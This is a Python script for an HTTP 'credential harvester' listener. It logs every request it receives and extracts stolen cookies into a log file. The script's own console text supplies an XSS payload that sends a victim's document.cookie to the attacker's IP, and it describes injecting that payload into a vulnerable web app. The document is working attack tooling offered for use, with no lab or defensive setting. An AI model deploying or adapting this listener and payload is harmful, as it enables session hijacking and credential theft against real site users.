import http.server
import socketserver
import urllib.parse
import datetime
import os

# --- Configuration ---
# Default port for the listener to run on
DEFAULT_LISTENER_PORT = 8000
# File to log received credentials/data
LOG_FILE = "harvested_credentials.log"

# --- Custom HTTP Request Handler ---
class CredentialHandler(http.server.SimpleHTTPRequestHandler):
    """
    A custom HTTP request handler that logs incoming GET and POST requests.
    Designed to capture data sent by XSS payloads or other exfiltration methods.
    """
    def log_data(self, client_address, method, path, headers, body=None):
        """
        Logs the incoming request details to a file.
        """
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] From: {client_address[0]}:{client_address[1]}\n"
        log_entry += f"Method: {method}\n"
        log_entry += f"Path: {path}\n"
        log_entry += "Headers:\n"
        for header, value in headers.items():
            log_entry += f"  {header}: {value}\n"
        if body:
            log_entry += f"Body: {body.decode('utf-8', errors='ignore')}\n"
        log_entry += "="*50 + "\n\n" # Separator for readability

        print(f"[{timestamp}] Received {method} request from {client_address[0]}:{client_address[1]} for {path}")
        if body:
            print(f"  Body: {body.decode('utf-8', errors='ignore')[:100]}...") # Print truncated body

        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

    def do_GET(self):
        """
        Handles GET requests. Logs the request path and headers.
        Responds with a 200 OK to the client.
        """
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Data Received!</h1></body></html>")

        # Parse query parameters from the path
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        # Log the request details
        self.log_data(self.client_address, "GET", self.path, self.headers)

        # Example: If an XSS payload sends document.cookie via a query parameter
        if 'cookie' in query_params:
            cookies = query_params['cookie'][0]
            print(f"  [!!!] HARVESTED COOKIE: {cookies}")
            with open(LOG_FILE, "a") as f:
                f.write(f"[HARVESTED COOKIE] {cookies}\n")

    def do_POST(self):
        """
        Handles POST requests. Logs the request path, headers, and body.
        Responds with a 200 OK to the client.
        """
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length)

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Data Received (POST)!</h1></body></html>")

        # Log the request details including the body
        self.log_data(self.client_address, "POST", self.path, self.headers, post_body)

# --- Main Listener Function ---
def run_credential_listener():
    """
    Initializes and runs the basic HTTP credential harvester/listener.
    """
    print("--- Basic Credential Harvester/Listener ---")
    print(f"Listener will run on port {DEFAULT_LISTENER_PORT}")
    print(f"All received data will be logged to '{LOG_FILE}'\n")
    print("To use this, you would typically inject a payload into a vulnerable web app")
    print("that makes a request to this listener (e.g., via XSS or a malicious form).")
    print("Example XSS payload to send cookie: <script>window.location='http://YOUR_IP:{PORT}/?cookie='+document.cookie;</script>")
    print("Replace YOUR_IP with your machine's IP address where this script is running.\n")

    # Ensure the log file exists or is created
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w') as f:
            f.write(f"--- Credential Harvester Log - Started: {datetime.datetime.now()} ---\n\n")
        print(f"Created log file: {LOG_FILE}")
    else:
        print(f"Appending to existing log file: {LOG_FILE}")


    try:
        # Create an HTTP server with our custom handler
        with socketserver.TCPServer(("", DEFAULT_LISTENER_PORT), CredentialHandler) as httpd:
            print(f"Serving HTTP on port {DEFAULT_LISTENER_PORT}...")
            # Activate the server; this will keep running until interrupted
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nListener shutting down...")
    except Exception as e:
        print(f"Error starting listener: {e}")

# Entry point for the script
if __name__ == "__main__":
    run_credential_listener()